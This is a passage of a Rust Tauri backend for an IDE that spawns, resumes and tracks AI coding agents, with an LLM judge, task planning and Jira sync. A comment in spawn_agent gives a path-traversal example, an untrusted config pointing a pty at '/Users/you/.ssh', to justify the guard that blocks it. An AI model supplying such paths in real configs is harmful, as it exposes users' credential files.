//! eterm IDE — a project-centric Tauri desktop shell. Projects collect their
//! agents in one place; agents (live + history) are persisted so they can be
//! resumed; tasks track the plan per project.

// Modules are `pub` so the headless `evor-daemon` binary (which depends on this
// crate as `ide_lib`) can reuse the exact same backend logic — file confinement,
// git, the pty session manager, the store — instead of forking it. Keeping one
// implementation is a security invariant: the confine/trust gates must not drift
// between the desktop app and the daemon.
pub mod claude;
pub mod cloud;
pub mod connect;
pub mod edits;
pub mod event;
pub mod fs;
pub mod git;
pub mod guard;
pub mod intent;
pub mod jira;
pub mod judge;
pub mod localrpc;
pub mod mobile;
pub mod notify;
pub mod pause;
pub mod proctree;
mod remote;
pub mod run;
pub mod secrets;
pub mod serve;
pub mod session;
pub mod settings;
pub mod skills;
pub mod store;
pub mod summary;
pub mod tasktrack;
pub mod watch;

use claude::{ClaudeSession, ClaudeUsage};
use edits::EditRecord;
use intent::IntentConfig;
use fs::{FileContent, FileEntry};
use git::{Branches, FileChange, GitStatus};
use run::Service;
use session::SessionManager;
use settings::{Settings, SettingsStore};
use std::sync::Arc;
use std::sync::Mutex;
use std::sync::atomic::{AtomicU64, Ordering};
use store::{AgentRecord, Project, Store, Task};
use tauri::{AppHandle, Emitter, Manager, State, WebviewUrl, WebviewWindowBuilder};
use tauri::menu::{MenuBuilder, MenuItemBuilder, PredefinedMenuItem, SubmenuBuilder};

/// Serializes mutating git operations so concurrent pulls/commits/pushes across
/// windows or buttons don't clobber each other.
#[derive(Default)]
pub struct GitLock(pub Mutex<()>);

/// Per-agent cache of the last judged (tail-hash → verdict), so an agent whose
/// output hasn't changed isn't re-sent to the LLM — pure repeated work.
#[derive(Default)]
struct JudgeCache(Mutex<std::collections::HashMap<String, (u64, judge::Judgement)>>);

fn hash_tail(s: &str) -> u64 {
    use std::hash::{Hash, Hasher};
    let mut h = std::collections::hash_map::DefaultHasher::new();
    s.hash(&mut h);
    h.finish()
}

static WINDOW_SEQ: AtomicU64 = AtomicU64::new(1);

/// Open another IDE window in the same process. State (Store, ptys) is shared,
/// so multiple windows coexist safely; each picks its own project.
#[tauri::command]
fn open_window(app: AppHandle) -> Result<(), String> {
    let n = WINDOW_SEQ.fetch_add(1, Ordering::Relaxed);
    let label = format!("w-{n}");
    WebviewWindowBuilder::new(&app, &label, WebviewUrl::App("index.html".into()))
        .title("Evor")
        .inner_size(1280.0, 820.0)
        .maximized(true)
        .build()
        .map_err(|e| e.to_string())?;
    Ok(())
}

/// "Stick out" the IDE: float this window above other apps (always-on-top).
#[tauri::command]
fn set_always_on_top(window: tauri::WebviewWindow, on: bool) -> Result<(), String> {
    window.set_always_on_top(on).map_err(|e| e.to_string())
}

/// Agent ids whose terminal is currently popped out into its own window.
#[derive(Default)]
struct PoppedOut(Mutex<std::collections::HashSet<String>>);

#[derive(Clone, serde::Serialize)]
struct PopoutEvent {
    id: String,
    open: bool,
}

fn popout_label(id: &str) -> String {
    format!(
        "term-{}",
        id.replace(|c: char| !c.is_ascii_alphanumeric() && c != '-' && c != '_', "-")
    )
}

/// Pop a single agent's terminal out into its own window (shares the same pty,
/// since state is in-process). The main window shows a "popped out" placeholder
/// while it's open, and re-attaches when it closes.
#[tauri::command]
fn pop_out_terminal(
    app: AppHandle,
    popped: State<PoppedOut>,
    id: String,
    title: Option<String>,
) -> Result<(), String> {
    let label = popout_label(&id);
    if let Some(w) = app.get_webview_window(&label) {
        let _ = w.set_focus();
        return Ok(());
    }
    let win = WebviewWindowBuilder::new(
        &app,
        &label,
        WebviewUrl::App(format!("index.html#term={id}").into()),
    )
    .title(format!("⧉ {}", title.unwrap_or_else(|| "Terminal".into())))
    .inner_size(860.0, 560.0)
    .build()
    .map_err(|e| e.to_string())?;

    popped.0.lock().unwrap().insert(id.clone());
    let _ = app.emit("popout-changed", PopoutEvent { id: id.clone(), open: true });

    // When the popout window closes, un-mark it so the main view re-attaches.
    let app2 = app.clone();
    let id2 = id.clone();
    win.on_window_event(move |ev| {
        if matches!(ev, tauri::WindowEvent::Destroyed) {
            if let Some(s) = app2.try_state::<PoppedOut>() {
                s.0.lock().unwrap().remove(&id2);
            }
            let _ = app2.emit("popout-changed", PopoutEvent { id: id2.clone(), open: false });
        }
    });
    Ok(())
}

/// Currently popped-out agent ids (for a window to sync on load).
#[tauri::command]
fn popped_out(popped: State<PoppedOut>) -> Vec<String> {
    popped.0.lock().unwrap().iter().cloned().collect()
}

/// Close an agent's popped-out window (so its terminal re-attaches in the IDE).
#[tauri::command]
fn close_popout(app: AppHandle, id: String) {
    if let Some(w) = app.get_webview_window(&popout_label(&id)) {
        let _ = w.close();
    }
}

// --- projects ---

/// Run a command against the desktop's LIVE managed state, with a `TauriSink` so
/// events tee to the webview + any connected mobile/cloud listeners. Shared by
/// the embedded mobile server (`mobile.rs`) and the cloud link (`cloud.rs`).
pub fn dispatch_app(
    app: &AppHandle,
    cmd: &str,
    args: &serde_json::Value,
) -> Result<serde_json::Value, String> {
    let store = app.state::<Store>();
    let settings = app.state::<SettingsStore>();
    let sessions = app.state::<SessionManager>();
    let git = app.state::<GitLock>();
    let watch_mgr = app.state::<watch::WatchManager>();
    let sink: event::Sink = Arc::new(event::TauriSink(app.clone()));
    let ctx = serve::Ctx {
        store: store.inner(),
        settings: settings.inner(),
        sessions: sessions.inner(),
        git_lock: &git.inner().0,
        watch_mgr: watch_mgr.inner(),
        sink: &sink,
    };
    serve::dispatch(&ctx, cmd, args)
}

/// Prepend the directory holding the bundled `evor` CLI to this process's PATH so
/// it resolves inside every spawned pty (children inherit our env). Checks the dir
/// next to the running binary (dev: `target/<profile>`; packaged: the app's MacOS
/// dir) and the Tauri resource dir. Best-effort: if no `evor` is found, PATH is
/// left untouched and the agent falls back to the documented `echo` channel.
fn inject_evor_on_path(app: &AppHandle) {
    let exe_name = if cfg!(windows) { "evor.exe" } else { "evor" };
    let mut dirs: Vec<std::path::PathBuf> = Vec::new();
    if let Ok(exe) = std::env::current_exe() {
        if let Some(d) = exe.parent() {
            dirs.push(d.to_path_buf());
        }
    }
    if let Ok(rd) = app.path().resource_dir() {
        dirs.push(rd);
    }
    dirs.retain(|d| d.join(exe_name).is_file());
    if dirs.is_empty() {
        return;
    }
    let existing = std::env::var_os("PATH").unwrap_or_default();
    let mut paths = dirs;
    paths.extend(std::env::split_paths(&existing));
    if let Ok(joined) = std::env::join_paths(paths) {
        std::env::set_var("PATH", joined);
    }
}

/// Reconcile the file watchers with the open projects, emitting `fs-changed`
/// through the Tauri webview. Thin adapter so the `watch` module stays
/// transport-agnostic (the daemon calls `watch::sync` with its own sink).
fn watch_sync(app: &AppHandle) {
    let store = app.state::<Store>();
    let mgr = app.state::<watch::WatchManager>();
    watch::sync(
        store.inner(),
        mgr.inner(),
        Arc::new(event::TauriSink(app.clone())),
    );
}

#[tauri::command]
fn add_project(app: AppHandle, store: State<Store>, path: String) -> Project {
    let project = store.add_project(&path);
    watch_sync(&app); // start watching the newly-opened root for the explorer
    project
}

#[tauri::command]
fn list_projects(store: State<Store>) -> Vec<Project> {
    store.list_projects()
}

#[tauri::command]
fn remove_project(app: AppHandle, store: State<Store>, id: String) {
    store.remove_project(&id);
    watch_sync(&app); // stop watching the closed root
}

// --- super-projects (named groups of separate-repo projects) ---

#[tauri::command]
fn list_super_projects(store: State<Store>) -> Vec<store::SuperProject> {
    store.list_super_projects()
}

#[tauri::command]
fn create_super_project(store: State<Store>, name: String) -> store::SuperProject {
    store.create_super_project(name.trim())
}

#[tauri::command]
fn rename_super_project(store: State<Store>, id: String, name: String) {
    store.rename_super_project(&id, name.trim());
}

#[tauri::command]
fn delete_super_project(store: State<Store>, id: String) {
    store.delete_super_project(&id);
}

#[tauri::command]
fn set_super_project_members(store: State<Store>, id: String, project_ids: Vec<String>) {
    store.set_super_project_members(&id, &project_ids);
}

// --- agents ---

/// Append the agent's own continue flag when resuming, so e.g. Claude Code picks
/// up its prior session instead of starting cold.
pub fn resume_command(command: &str) -> String {
    let head = command.split_whitespace().next().unwrap_or("");
    let base = head.rsplit('/').next().unwrap_or(head);
    match base {
        "claude" => format!("{command} --continue"),
        "codex" => format!("{command} resume --last"),
        _ => command.to_string(),
    }
}

/// Like `resume_command` but idempotent — if the stored command already carries
/// a continue/resume flag (e.g. a continued session), re-use it as-is.
pub fn resume_for(command: &str) -> String {
    if command.contains("--continue")
        || command.contains("--resume")
        || command.contains(" resume")
    {
        command.to_string()
    } else {
        resume_command(command)
    }
}

#[tauri::command]
fn list_agents(store: State<Store>, project_id: String) -> Vec<AgentRecord> {
    store.list_agents(&project_id)
}

/// All running agents across projects (for the multi-project rail).
#[tauri::command]
fn running_agents(store: State<Store>) -> Vec<AgentRecord> {
    store.list_running()
}

/// Every agent record across all projects (for the palette + grid "resume").
#[tauri::command]
fn all_agents(store: State<Store>) -> Vec<AgentRecord> {
    store.list_all()
}

#[tauri::command]
fn spawn_agent(
    app: AppHandle,
    store: State<Store>,
    manager: State<SessionManager>,
    project_id: String,
    title: String,
    command: Option<String>,
    resume_from: Option<String>,
    subdir: Option<String>,
    rows: Option<u16>,
    cols: Option<u16>,
) -> Result<AgentRecord, String> {
    let project = store.get_project(&project_id).ok_or("unknown project")?;

    // Resolve the working dir — a service may run in a monorepo subdir. The
    // subdir comes from a run config (which may be AI-generated or repo-supplied),
    // so it must stay INSIDE the project: reject absolute paths and `..` segments.
    // Without this, `Path::join` with an absolute `sub` (e.g. "/Users/you/.ssh")
    // silently replaces the project root, letting an untrusted config point the
    // spawned PTY's working directory anywhere on disk.
    let cwd = match subdir.filter(|s| !s.trim().is_empty()) {
        Some(sub) => {
            let rel = std::path::Path::new(&sub);
            if rel.is_absolute()
                || rel
                    .components()
                    .any(|c| matches!(c, std::path::Component::ParentDir))
            {
                return Err("invalid working directory".into());
            }
            std::path::Path::new(&project.path)
                .join(rel)
                .to_string_lossy()
                .to_string()
        }
        None => project.path.clone(),
    };

    // Resolve the command: explicit, resumed (inherits prior + continue flag),
    // or the default shell.
    let command = if let Some(cmd) = command.filter(|c| !c.trim().is_empty()) {
        cmd
    } else if let Some(src_id) = resume_from.as_deref() {
        let src = store.get_agent(src_id).ok_or("unknown agent to resume")?;
        resume_command(&src.command)
    } else {
        std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())
    };

    let title = if title.trim().is_empty() {
        project.name.clone()
    } else {
        title
    };

    let rec = store.add_agent(&project_id, &title, &command, &cwd);

    // Per-agent edit + task tracking: managed skill blocks + log paths.
    let _ = edits::ensure_skill(&project.path);
    let _ = tasktrack::ensure_skill(&project.path);
    let edits_path = edits::edits_path(&project.path, &rec.id);
    let tasks_path = tasktrack::tasks_path(&project.path, &rec.id);
    if let Some(dir) = edits_path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    // Read-only "find task" snapshot of this project's open tasks for the agent.
    let project_tasks_path = write_project_tasks(&store, &project.path, &project_id, &rec.id);

    manager.spawn(
        Arc::new(event::TauriSink(app.clone())),
        rec.id.clone(),
        title,
        cwd,
        command,
        edits_path.to_string_lossy().to_string(),
        tasks_path.to_string_lossy().to_string(),
        project_tasks_path,
        rows.unwrap_or(24),
        cols.unwrap_or(80),
    )?;
    Ok(rec)
}

/// Re-launch an EXISTING agent in place (same record/id), applying the agent's
/// continue flag. Does not create a new history entry.
#[tauri::command]
fn resume_agent(
    app: AppHandle,
    store: State<Store>,
    manager: State<SessionManager>,
    id: String,
    rows: Option<u16>,
    cols: Option<u16>,
) -> Result<AgentRecord, String> {
    let rec = store.get_agent(&id).ok_or("unknown agent")?;
    let command = resume_for(&rec.command);

    // Per-agent edit tracking — refresh the skill block and reuse this agent's
    // log path so the resumed session keeps reporting edits. Anchor the log to
    // the project root (cwd may be a monorepo subdir).
    let project_root = store
        .get_project(&rec.project_id)
        .map(|p| p.path)
        .unwrap_or_else(|| rec.cwd.clone());
    let _ = edits::ensure_skill(&project_root);
    let _ = tasktrack::ensure_skill(&project_root);
    let edits_path = edits::edits_path(&project_root, &rec.id);
    let tasks_path = tasktrack::tasks_path(&project_root, &rec.id);
    if let Some(dir) = edits_path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    // Refresh the read-only "find task" snapshot for the resumed agent.
    let project_tasks_path = write_project_tasks(&store, &project_root, &rec.project_id, &rec.id);

    manager.spawn(
        Arc::new(event::TauriSink(app.clone())),
        rec.id.clone(),
        rec.title.clone(),
        rec.cwd.clone(),
        command,
        edits_path.to_string_lossy().to_string(),
        tasks_path.to_string_lossy().to_string(),
        project_tasks_path,
        rows.unwrap_or(24),
        cols.unwrap_or(80),
    )?;
    store.set_agent_status(&id, "running");
    Ok(rec)
}

#[tauri::command]
fn write_input(manager: State<SessionManager>, id: String, data: String) -> Result<(), String> {
    manager.write_input(&id, &data)
}

#[tauri::command]
fn resize_agent(
    manager: State<SessionManager>,
    id: String,
    rows: u16,
    cols: u16,
) -> Result<(), String> {
    manager.resize(&id, rows, cols)
}

#[tauri::command]
fn close_agent(store: State<Store>, manager: State<SessionManager>, id: String) -> Result<(), String> {
    manager.close(&id)?;
    store.set_agent_status(&id, "exited");
    Ok(())
}

/// Frontend reports a pty-exit so the store reflects it.
#[tauri::command]
fn mark_agent_exited(store: State<Store>, id: String) {
    store.set_agent_status(&id, "exited");
}

/// Rename an agent (its displayed title).
#[tauri::command]
fn set_agent_title(store: State<Store>, id: String, title: String) {
    let t = title.trim();
    if !t.is_empty() {
        store.set_agent_title(&id, t);
    }
}

/// Base64 scrollback for restoring a discarded (background) terminal.
#[tauri::command]
fn agent_scrollback(manager: State<SessionManager>, id: String) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(manager.scrollback(&id))
}

/// Current (rows, cols) of an agent's pty, so a remote viewer can match it.
#[tauri::command]
fn agent_size(manager: State<SessionManager>, id: String) -> Option<(u16, u16)> {
    manager.size(&id)
}

/// Ask the hidden helper (claude/codex) to classify an idle agent's state.
/// Returns `None` when no helper is configured or it failed — the frontend then
/// keeps its regex-based guess. The helper is one-shot and never tracked.
///
/// This is `async` and runs the (blocking, multi-second) `claude -p` call on the
/// blocking thread pool via `spawn_blocking`, so it never holds a Tauri command
/// worker — keystrokes and other IPC stay responsive while the judge thinks.
#[tauri::command]
async fn judge_agent(
    manager: State<'_, SessionManager>,
    id: String,
) -> Result<Option<judge::Judgement>, String> {
    // Snapshot the tail synchronously (cheap), then hand the slow part off-thread.
    let bytes = manager.scrollback(&id);
    if bytes.is_empty() {
        return Ok(None);
    }
    let stripped = eterm_core::strip_ansi(&bytes);
    let from = stripped.len().saturating_sub(3000);
    let from = (from..=stripped.len())
        .find(|&i| stripped.is_char_boundary(i))
        .unwrap_or(0);
    let tail = stripped[from..].to_string();
    tauri::async_runtime::spawn_blocking(move || judge::classify(&tail))
        .await
        .map_err(|e| e.to_string())
}

/// Per-agent verdict returned by the batch judge.
#[derive(serde::Serialize)]
struct JudgeResult {
    id: String,
    judgement: Option<judge::Judgement>,
}

/// Classify several idle agents in ONE helper call. Reuses a single `claude -p`
/// process for all of them instead of spawning one per agent — far cheaper when
/// multiple agents go idle at once. Runs off-thread via `spawn_blocking`.
#[tauri::command]
async fn judge_agents(
    manager: State<'_, SessionManager>,
    cache: State<'_, JudgeCache>,
    ids: Vec<String>,
) -> Result<Vec<JudgeResult>, String> {
    // Snapshot each agent's tail + a content hash (kept short to bound prompt size).
    let items: Vec<(String, String, u64)> = ids
        .iter()
        .map(|id| {
            let stripped = eterm_core::strip_ansi(&manager.scrollback(id));
            let from = stripped.len().saturating_sub(1500);
            let from = (from..=stripped.len())
                .find(|&i| stripped.is_char_boundary(i))
                .unwrap_or(0);
            let tail = stripped[from..].to_string();
            let hash = hash_tail(&tail);
            (id.clone(), tail, hash)
        })
        .collect();

    // Split: agents whose tail is unchanged since last judge reuse the cached
    // verdict (no LLM call); only changed ones are sent to the batch.
    let mut results: Vec<JudgeResult> = Vec::new();
    let mut to_judge: Vec<(String, String)> = Vec::new();
    {
        let c = cache.0.lock().unwrap();
        for (id, tail, hash) in &items {
            match c.get(id) {
                Some((h, j)) if h == hash => {
                    results.push(JudgeResult { id: id.clone(), judgement: Some(j.clone()) });
                }
                _ => to_judge.push((id.clone(), tail.clone())),
            }
        }
    }
    if to_judge.is_empty() {
        return Ok(results);
    }

    let batch = to_judge.clone();
    let verdicts = tauri::async_runtime::spawn_blocking(move || judge::classify_batch(&batch))
        .await
        .map_err(|e| e.to_string())?;

    // Cache fresh verdicts by their tail hash so the next unchanged call is free.
    let mut c = cache.0.lock().unwrap();
    for ((id, _), judgement) in to_judge.into_iter().zip(verdicts) {
        if let Some(j) = &judgement {
            if let Some((_, _, hash)) = items.iter().find(|(i, _, _)| *i == id) {
                c.insert(id.clone(), (*hash, j.clone()));
            }
        }
        results.push(JudgeResult { id, judgement });
    }
    Ok(results)
}

/// Name of the available judge helper (e.g. "claude"), or `None`.
#[tauri::command]
fn judge_helper() -> Option<String> {
    judge::helper_name()
}

/// Resolve an agent command to the absolute path of its program, or `None` if
/// it can't be found. Powers the Settings → Agents "detected" indicator and lets
/// the UI warn before launching an unavailable agent.
#[tauri::command]
fn which_agent(command: String) -> Option<String> {
    let program = command.split_whitespace().next().unwrap_or_default();
    if program.is_empty() {
        return None;
    }
    session::resolve_program(program)
}

#[tauri::command]
fn archive_agent(store: State<Store>, manager: State<SessionManager>, id: String) {
    let _ = manager.close(&id);
    store.set_agent_status(&id, "archived");
}

#[tauri::command]
fn delete_agent(store: State<Store>, manager: State<SessionManager>, id: String) {
    let _ = manager.close(&id);
    store.delete_agent(&id);
}

/// Suspend an agent for a project PAUSE: kill its pty but KEEP its record with a
/// distinct "paused" status — so it's excluded from the running list yet not
/// reset to "exited" on the next boot (that reset only touches "running"), and
/// `resume_agent` can bring it back in place (Claude with `--continue`, a service
/// by re-running its command).
#[tauri::command]
fn pause_agent(store: State<Store>, manager: State<SessionManager>, id: String) -> Result<(), String> {
    manager.close(&id)?;
    store.set_agent_status(&id, "paused");
    Ok(())
}

// --- tasks ---

#[tauri::command]
fn list_tasks(store: State<Store>, project_id: String) -> Vec<Task> {
    store.list_tasks(&project_id)
}

/// Every task across all projects (for the Tasks / planning page).
#[tauri::command]
fn all_tasks(store: State<Store>) -> Vec<Task> {
    store.list_all_tasks()
}

#[tauri::command]
fn add_task(
    store: State<Store>,
    project_id: String,
    title: String,
    agent_id: Option<String>,
    planned_for: Option<String>,
    description: Option<String>,
) -> Task {
    let t = store.add_task(&project_id, &title, agent_id, planned_for, description);
    refresh_task_snapshots(&store, &project_id);
    t
}

#[tauri::command]
async fn update_task(store: State<'_, Store>, id: String, status: String) -> Result<(), String> {
    store.update_task(&id, &status);
    // Two-way sync: a Jira-sourced task pushes its new lifecycle state back as a
    // Jira transition (AI-mapped onto this board's custom workflow). Status only —
    // no comment is posted. Best-effort + off-thread.
    if let Some(task) = store.get_task(&id) {
        refresh_task_snapshots(&store, &task.project_id);
        if task.source == "jira" {
            if let (Some(key), Some(cfg)) = (task.external_id, secrets::load_jira()) {
                let st = status.clone();
                let _ = tauri::async_runtime::spawn_blocking(move || {
                    jira_push_status(&cfg, &key, &st)
                })
                .await;
            }
        }
    }
    Ok(())
}

/// Push a lifecycle change onto a Jira issue: transition it (AI-mapped onto the
/// board's actual workflow, falling back to the status-category heuristic).
/// Transition only — no comment. All best-effort.
fn jira_push_status(cfg: &secrets::JiraConfig, key: &str, status: &str) {
    // Prefer an AI mapping from our lifecycle word → this board's transition.
    match jira::list_transitions(cfg, key) {
        Ok(trs) if !trs.is_empty() => {
            let opts: Vec<String> = trs
                .iter()
                .map(|t| format!("{} → {} [{}]", t.name, t.to_status, t.to_category))
                .collect();
            match judge::pick_transition(status, &opts) {
                Some(i) => {
                    let _ = jira::apply_transition(cfg, key, &trs[i].id);
                }
                None => {
                    let _ = jira::transition_issue(cfg, key, status);
                }
            }
        }
        _ => {
            let _ = jira::transition_issue(cfg, key, status);
        }
    }
}

#[tauri::command]
fn set_task_description(store: State<Store>, id: String, description: String) {
    store.set_task_description(&id, &description);
    if let Some(t) = store.get_task(&id) {
        refresh_task_snapshots(&store, &t.project_id);
    }
}

/// Replace a task's breakdown steps.
#[tauri::command]
fn set_task_steps(store: State<Store>, id: String, steps: Vec<store::Step>) {
    store.set_task_steps(&id, &steps);
    if let Some(t) = store.get_task(&id) {
        refresh_task_snapshots(&store, &t.project_id);
    }
}

/// Update one step's status within a task's breakdown.
#[tauri::command]
fn update_step(store: State<Store>, task_id: String, step_id: String, status: String) -> Option<Task> {
    let mut task = store.get_task(&task_id)?;
    for s in task.steps.iter_mut() {
        if s.id == step_id {
            s.status = status.clone();
        }
    }
    store.set_task_steps(&task_id, &task.steps);
    refresh_task_snapshots(&store, &task.project_id);
    store.get_task(&task_id)
}

/// Break a task down into ordered steps using the AI helper acting as an
/// architect, store them, and return the updated task. Errors if no helper.
#[tauri::command]
async fn breakdown_task(store: State<'_, Store>, id: String) -> Result<Task, String> {
    let task = store.get_task(&id).ok_or("unknown task")?;
    let title = task.title.clone();
    let desc = task.description.clone().unwrap_or_default();
    let steps = tauri::async_runtime::spawn_blocking(move || judge::plan_steps(&title, &desc))
        .await
        .map_err(|e| e.to_string())?
        .ok_or_else(|| "No AI helper (claude/codex) found, or it returned nothing.".to_string())?;
    if steps.is_empty() {
        return Err("The architect couldn't break this down.".into());
    }
    store.set_task_steps(&id, &steps);
    refresh_task_snapshots(&store, &task.project_id);
    store.get_task(&id).ok_or_else(|| "task vanished".into())
}

/// Write the read-only "find task" snapshot for an agent: this project's OPEN
/// tasks (todo|doing) as JSON at `project-tasks.json`. The agent reads it via
/// `$EVORIDE_PROJECT_TASKS` to find what to work on. Returns the path (string)
/// to hand to the pty env. Best-effort — failures degrade to a missing file,
/// which the skill block treats as "no tracked tasks".
pub fn write_project_tasks(store: &Store, project_root: &str, project_id: &str, agent_id: &str) -> String {
    let path = tasktrack::project_tasks_path(project_root, agent_id);
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    let open: Vec<Task> = store
        .list_tasks(project_id)
        .into_iter()
        .filter(|t| t.status != "done" && t.status != "verified")
        .collect();
    if let Ok(json) = serde_json::to_string_pretty(&open) {
        let _ = std::fs::write(&path, json);
    }
    path.to_string_lossy().to_string()
}

/// Rewrite the `$EVORIDE_PROJECT_TASKS` snapshot for every RUNNING agent of a
/// project, so agents see tasks created/updated AFTER they spawned (the
/// snapshot used to be written only at spawn time and went stale for the whole
/// session). Best-effort and cheap: a handful of small JSON writes, only on
/// task mutations.
pub(crate) fn refresh_task_snapshots(store: &Store, project_id: &str) {
    if project_id.is_empty() {
        return;
    }
    let Some(project) = store.get_project(project_id) else {
        return;
    };
    for a in store.list_agents(project_id) {
        if a.status == "running" {
            let _ = write_project_tasks(store, &project.path, project_id, &a.id);
        }
    }
}

/// Pull an agent's reported task updates (from `$EVORIDE_TASKS`), in order, and
/// apply them. An agent declares NEW work with `{"new_task":"…"}` — that creates
/// (or re-targets) an EvorIDE task for the agent's project, marks it in-progress,
/// links it to the agent, and makes it the "current" task; later status/step/note
/// lines apply to whatever the current task is. Each log line is consumed exactly
/// once (a per-agent cursor), so creates and notes don't duplicate across polls.
/// Returns every task touched this round so the UI can upsert (add or update).
#[tauri::command]
fn ingest_agent_tasks(store: State<Store>, project: String, agent_id: String) -> Vec<Task> {
    apply_agent_tasks(&store, &project, &agent_id)
}

/// Core of [`ingest_agent_tasks`], callable off the Tauri command surface (e.g.
/// the loopback RPC the `evor` CLI flushes through — see `localrpc.rs`). `project`
/// is the project ROOT path (where `.evoride/agents/<id>/tasks.jsonl` lives).
pub(crate) fn apply_agent_tasks(store: &Store, project: &str, agent_id: &str) -> Vec<Task> {
    let (updates, cursor) = tasktrack::read_updates_since(project, agent_id);
    if updates.is_empty() {
        // Still advance the cursor past any malformed/empty trailing lines.
        tasktrack::write_cursor(project, agent_id, cursor);
        return Vec::new();
    }

    // The agent's project (for new-task creates), and existing titles → id so a
    // `new_task` never duplicates a task that already exists (created or re-runs).
    let project_id = store.get_agent(agent_id).map(|a| a.project_id);
    let mut by_title: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    if let Some(pid) = &project_id {
        for t in store.list_tasks(pid) {
            by_title.insert(t.title.trim().to_lowercase(), t.id);
        }
    }

    // Current task we're reporting against — starts at the agent's linked task.
    let mut current: Option<String> = store.task_for_agent(agent_id).map(|t| t.id);
    let day = summary::today();
    let mut touched: std::collections::HashSet<String> = std::collections::HashSet::new();

    for u in &updates {
        // New task: create (or re-target) and switch the current task to it.
        if let Some(title) = u.new_task.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
            let key = title.to_lowercase();
            let id = if let Some(existing) = by_title.get(&key) {
                let id = existing.clone();
                store.set_task_agent(&id, agent_id); // round-trip status to this agent
                id
            } else if let Some(pid) = &project_id {
                let desc = u
                    .description
                    .as_deref()
                    .or(u.note.as_deref())
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .map(|s| s.to_string());
                let t = store.add_task(pid, title, Some(agent_id.to_string()), Some(day.clone()), desc);
                store.update_task(&t.id, "doing"); // starting on it now
                by_title.insert(key, t.id.clone());
                t.id
            } else {
                continue; // no project to attach to
            };
            touched.insert(id.clone());
            current = Some(id);
            continue;
        }

        let Some(cur) = current.clone() else { continue };

        // Step status: match by id or case-insensitive title contains.
        if let Some(stepref) = u.step.as_deref() {
            if let Some(mut task) = store.get_task(&cur) {
                let want = u.status.as_deref().unwrap_or("done");
                let key = stepref.trim().to_lowercase();
                let mut hit = false;
                for st in task.steps.iter_mut() {
                    if st.id == stepref || st.title.to_lowercase().contains(&key) {
                        st.status = want.to_string();
                        hit = true;
                    }
                }
                if hit {
                    store.set_task_steps(&cur, &task.steps);
                    touched.insert(cur.clone());
                }
            }
            continue;
        }

        // Task status.
        if let Some(s) = u.status.as_deref() {
            if matches!(s, "todo" | "doing" | "done") {
                store.update_task(&cur, s);
                touched.insert(cur.clone());
            }
        }

        // Free-text progress note → appended to the current task's description.
        if let Some(n) = u.note.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
            store.append_task_description(&cur, &format!("• {n}"));
            touched.insert(cur.clone());
        }
    }

    // Consume the lines we just applied so the next poll starts after them.
    tasktrack::write_cursor(project, agent_id, cursor);

    // Mirror status back to Jira for any touched Jira ticket (fire-and-forget).
    for id in &touched {
        if let Some(t) = store.get_task(id) {
            if t.source == "jira" {
                if let (Some(key), Some(cfg)) = (t.external_id.clone(), secrets::load_jira()) {
                    let st = t.status.clone();
                    std::thread::spawn(move || jira_push_status(&cfg, &key, &st));
                }
            }
        }
    }

    // The agent changed the board — let every running agent in the project see
    // the new state (including OTHER agents working alongside this one).
    if !touched.is_empty() {
        if let Some(pid) = &project_id {
            refresh_task_snapshots(store, pid);
        }
    }

    touched
        .into_iter()
        .filter_map(|id| store.get_task(&id))
        .collect()
}

/// Turn a freeform note into one or more structured tasks via the AI helper
/// (`claude -p` / `codex`), matching each to a project by name. Runs the slow
/// helper off-thread; created tasks are planned for today. Errors if no helper.
#[tauri::command]
async fn plan_tasks(store: State<'_, Store>, input: String) -> Result<Vec<Task>, String> {
    let input = input.trim().to_string();
    if input.is_empty() {
        return Err("Nothing to plan.".into());
    }
    let projects: Vec<(String, String, String)> = store
        .list_projects()
        .into_iter()
        .map(|p| (p.id, p.name, p.path))
        .collect();
    let day = summary::today();
    let planned = tauri::async_runtime::spawn_blocking(move || judge::plan_tasks(&input, &projects))
        .await
        .map_err(|e| e.to_string())?;
    let planned = planned
        .ok_or_else(|| "No AI helper (claude/codex) found, or it returned nothing.".to_string())?;
    if planned.is_empty() {
        return Err("Couldn't extract any tasks from that.".into());
    }
    let mut created = Vec::new();
    for p in planned {
        let mut t = store.add_task(&p.project_id, &p.title, None, Some(day.clone()), None);
        if p.status != "todo" {
            store.update_task(&t.id, &p.status);
            t.status = p.status;
        }
        created.push(t);
    }
    for pid in created
        .iter()
        .map(|t| t.project_id.clone())
        .collect::<std::collections::HashSet<_>>()
    {
        refresh_task_snapshots(&store, &pid);
    }
    Ok(created)
}

/// Assign a task to a project ("" = unassigned).
#[tauri::command]
fn assign_task(store: State<Store>, id: String, project_id: String) {
    let old = store.get_task(&id).map(|t| t.project_id);
    store.set_task_project(&id, &project_id);
    // The task moved: both the losing and gaining projects' agents need fresh snapshots.
    if let Some(old_pid) = old.filter(|p| p != &project_id) {
        refresh_task_snapshots(&store, &old_pid);
    }
    refresh_task_snapshots(&store, &project_id);
}

/// Link a task to the agent now working it (so its reported status round-trips).
#[tauri::command]
fn link_task_agent(store: State<Store>, id: String, agent_id: String) {
    store.set_task_agent(&id, &agent_id)
}

#[tauri::command]
fn delete_task(store: State<Store>, id: String) {
    let pid = store.get_task(&id).map(|t| t.project_id);
    store.delete_task(&id);
    if let Some(pid) = pid {
        refresh_task_snapshots(&store, &pid);
    }
}

/// Append a line to a task's description — used to merge a duplicate's wording
/// into the existing task.
#[tauri::command]
fn append_task_note(store: State<Store>, id: String, note: String) {
    let n = note.trim();
    if !n.is_empty() {
        store.append_task_description(&id, n);
        if let Some(t) = store.get_task(&id) {
            refresh_task_snapshots(&store, &t.project_id);
        }
    }
}

/// A possible duplicate the user is warned about before a task is created.
#[derive(serde::Serialize)]
struct DuplicateHit {
    task_id: String,
    task_title: String,
    task_status: String,
    reason: String,
}

/// Ask the AI helper whether `title` duplicates an existing task. Checks the
/// target project plus Unassigned (where overlaps usually hide); when no project
/// is given, checks everything. Returns the match (with its title/status) or
/// None — also None when no helper is configured, so creation never blocks.
#[tauri::command]
async fn check_duplicate_task(
    store: State<'_, Store>,
    title: String,
    project_id: String,
) -> Result<Option<DuplicateHit>, String> {
